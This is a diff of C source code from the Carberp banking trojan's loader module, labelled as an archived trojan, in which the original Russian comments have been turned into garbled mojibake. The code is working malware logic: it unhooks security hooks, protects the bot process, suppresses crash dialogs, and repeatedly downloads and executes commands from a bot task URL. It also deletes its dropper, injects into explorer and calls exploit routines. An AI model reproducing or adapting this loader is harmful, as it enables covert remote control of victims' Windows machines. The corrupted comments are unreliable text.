@@ -1,6 +1,17 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 //-------------------------------------------------------------
-//  Главный модуль сборки Loader
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Loader
 //-------------------------------------------------------------
 
 #include <windows.h>
@@ -21,19 +32,19 @@
 #pragma comment(linker, "/ENTRY:MyMain" )
 
 
-WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку
-WCHAR FileToDelete[ MAX_PATH ]; //путь для удаления первоначального файла бота
+WCHAR TempFileName[ MAX_PATH ]; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+WCHAR FileToDelete[ MAX_PATH ]; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
-DWORD dwKillPid		 = 0; //пид для убийства процесса бота
-DWORD dwFirst	     = 0; //запуск в первый раз
-DWORD dwAlreadyRun   = 0; //если уже запущены
-DWORD dwGrabberRun	 = 0; //отработал ли граббер
-DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
-//DWORD dwExplorerPid  = 0; //пид эксплорера
+DWORD dwKillPid		 = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+DWORD dwFirst	     = 0; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+DWORD dwAlreadyRun   = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+DWORD dwGrabberRun	 = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+DWORD dwExplorerSelf = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//DWORD dwExplorerPid  = 0; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-//получаем пид эксплорера
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-void DeleteDropper() // убиваем процесс, стираем файл
+void DeleteDropper() // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 {
 	if ( dwKillPid != 0 && m_wcslen( FileToDelete ) > 0 )
 	{
@@ -48,7 +59,7 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 	UnhookDlls();
 	BOT::Protect(NULL);
 
-	// Отключаем отображение ошибок при крахе процесса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DisableShowFatalErrorDialog();
 
 
@@ -62,12 +73,12 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 		{
 			URL = GetBotScriptURL(SCRIPT_TASK);
 			
-			// Загружаем и выполняем команду
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 			DownloadAndExecuteCommand(NULL, URL);
 			STR::Free(URL);
 
-			// Приостанавливаем выполнение команд
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			if (!TaskManagerSleep(NULL))
 				break;
 		}
@@ -83,7 +94,7 @@ void ExplorerMain()
 	if ( !dwExplorerSelf )
 		UnhookDlls();
 
-	// Отключаем отображение ошибок при крахе процесса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DisableShowFatalErrorDialog();
 
 
@@ -109,7 +120,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
 	UnhookDlls();
 
-	if ( dwExplorerSelf ) //если инжект был в свой эксплорер завершаемся
+	if ( dwExplorerSelf ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		dwExplorerSelf = 0;
 
@@ -131,14 +142,14 @@ int APIENTRY MyMain()
 {
 
 
-	UnhookDlls(); //снимаем хуки
+	UnhookDlls(); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 	WCHAR ModulePath[ MAX_PATH ];
 
 	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
 	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false );
 
-	if ( dwProcessHash == BOT::GetBotExeNameHash() ) // запуск из самого бота
+	if ( dwProcessHash == BOT::GetBotExeNameHash() ) // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	{
 		KillOutpost();
 		DWORD dwExploits = SetExploits();
